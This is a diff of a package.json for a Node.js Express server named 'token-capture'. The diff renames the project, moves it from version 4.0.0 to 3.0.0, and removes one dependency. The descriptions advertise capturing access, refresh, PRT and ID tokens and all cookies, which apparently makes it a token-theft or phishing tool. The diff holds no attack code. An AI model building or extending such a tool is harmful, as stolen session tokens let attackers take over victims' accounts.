@@ -1,7 +1,7 @@
 {
-  "name": "complete-advanced-token-capture",
-  "version": "4.0.0",
-  "description": "Complete Advanced Token Capture - NO TRUNCATION - TXT Reports - All Cookies - File Uploads",
+  "name": "ultra-advanced-token-capture",
+  "version": "3.0.0",
+  "description": "Ultra-Advanced Token Capture - Access, Refresh, PRT, ID + All Cookies - JSON Format",
   "main": "server.js",
   "scripts": {
     "start": "node server.js"
@@ -10,8 +10,7 @@
     "express": "^4.18.2",
     "axios": "^1.6.2",
     "dotenv": "^16.3.1",
-    "cookie-parser": "^1.4.6",
-    "form-data": "^4.0.0"
+    "cookie-parser": "^1.4.6"
   },
   "engines": {
     "node": ">=18.0.0"
